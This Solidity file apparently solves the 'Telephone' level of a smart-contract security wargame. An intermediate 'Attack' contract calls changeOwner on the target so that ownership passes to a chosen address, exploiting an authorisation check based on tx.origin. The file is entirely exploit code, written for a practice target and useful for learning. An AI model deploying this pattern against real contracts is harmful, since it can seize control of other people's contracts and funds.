// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract Attack {
    Telephone telephone;

    constructor(address _address) public {
        /// @notice creates an instance of the Telephone Smart Contract
        telephone = Telephone(_address);
    }

    /// @notice IF we can call the function from our address, we will become the new owner...
    function attack(address _address) public {
        telephone.changeOwner(_address);
    }
}
